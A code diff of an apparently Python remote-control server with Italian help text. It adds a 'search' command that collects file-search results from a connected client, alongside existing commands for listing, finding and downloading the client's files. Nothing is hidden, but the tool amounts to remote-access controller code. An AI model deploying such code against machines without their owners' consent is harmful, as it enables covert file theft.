@@ -102,6 +102,42 @@ def filespath(clientConnection,fileLog):
         return fileLog
 
 
+def search(clientConnection,fileLog):
+
+    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Search File", colour="green", ncols=40, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+        sleep(0.2)
+    print("Wait...")
+
+    try:
+        filerecv = clientConnection.recv(1024)
+        try:
+            fileIf = filerecv.decode(FORMAT)
+        except:
+            fileIf = ""
+
+        if fileIf[0:7] != "[ERROR]":
+            fileLog = fileLog + "\n"
+            while (filerecv != b'[END]'):
+                print(fileIf, end="")
+                fileLog = fileLog + fileIf
+                filerecv = clientConnection.recv(1024)
+                fileIf = filerecv.decode(FORMAT)
+
+            print("\n")
+            fileLog = fileLog + "\n"
+            return fileLog
+
+        else:
+            print(fileIf)
+            fileLog = fileLog + "\n" + fileIf + "\n"
+            return fileLog
+
+    except:
+        fileLog = fileLog + "\n" + "Command search gone wrong\n"
+        print("Command search gone wrong\n")
+        return fileLog
+
+
 def download(comando,clientConnection,fileLog):
 
     nomeFile='null'
@@ -268,7 +304,6 @@ def remoteControl(clientConnection,buff,fileLog):
                     print("Regular Expression not matched!")
                     fileLog = fileLog + "\n" + "Regular Expression not matched!\n"
 
-
             elif comando[0:4] == "find":
 
                 if regexcheck_find(comando) == True:
@@ -340,6 +375,15 @@ def remoteControl(clientConnection,buff,fileLog):
                     #traceback.print_exc()
                     print("\nAn error occurred, try again\n")
                     fileLog = fileLog + "\n" + "An error occurred, try again...\n"
+
+            elif comando[0:6] == "search":
+                reg = r'^search [\s\S]+\.[a-z]{1,4}'
+                reg2 = r'^search ([a-zA-Z0-9, ,\-,\_]+)'
+                if (re.match(reg, comando)) or (re.match(reg2, comando)):
+                    fileLog=search(clientConnection,fileLog)
+                else:
+                    print("Regular Expression not matched!")
+                    fileLog = fileLog + "\n" + "Regular Expression not matched!\n"
 
             elif comando[0:12] == "file recenti":
                 try:
@@ -415,7 +459,6 @@ def remoteControl(clientConnection,buff,fileLog):
                     print("Regular Expression not matched!")
                     fileLog = fileLog + "\n" + "Regular Expression not matched!\n"
 
-
             else:
                print("[ERROR] Command not found... \n")
                fileLog = fileLog + "\n" + "[ERROR] Command not found... \n"
@@ -466,8 +509,7 @@ def commandsHelp():
     print(
         f"\n#####                                       Comandi disponibili                                                     ####")
     print()
-    print(
-        f"Download di file:                           download <\"nomeFile.estensione\"> <path> (txt docx pdf video foto excel cartelle zip ")
+    print(f"Download di file:                           download <\"nomeFile.estensione\"> <path> (txt docx pdf video foto excel cartelle zip ")
     print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione> ( .pdf, .dpcx, .txt, ecc...")
     print(f"Mostra Working Directory:                   pwd")
     print(f"Lista dei file in un percorso:              ls <Path>")
@@ -480,6 +522,7 @@ def commandsHelp():
     print(f"Informazioni S.O. client:                   info")
     print(f"Lista file modificati di recente            file recenti")
     print(f"Aprire un file.zip:                         open <\"nomeFile.zip\">")
+    print(f"Cercare un file con una parola chiava:      search <nome>")
     print()
     print("Tipologie di path:")
     print("\t'.'        indica il path corrente")
